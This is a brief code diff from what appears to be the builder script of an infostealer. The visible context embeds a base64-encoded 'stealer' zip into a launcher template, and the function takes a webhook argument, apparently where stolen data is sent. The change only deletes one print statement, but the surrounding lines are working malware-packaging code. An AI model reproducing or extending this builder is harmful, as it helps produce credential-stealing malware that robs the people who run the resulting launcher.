@@ -63,7 +63,6 @@ def builder(webhook, output):
     zipbase64 = b64encode(open(stealerzip, "rb").read())
     os.remove(stealerzip)
 
-    print(f"{'-'*30} Configure launcher... {'-'*30}")
     print(f"[{Fore.CYAN}*{Fore.RESET}] Setup launcher...")
     with open(launcherPath, "r") as f:
         template = f.read().replace(r"%b64zip%", 'b"'+zipbase64.decode()+'"')
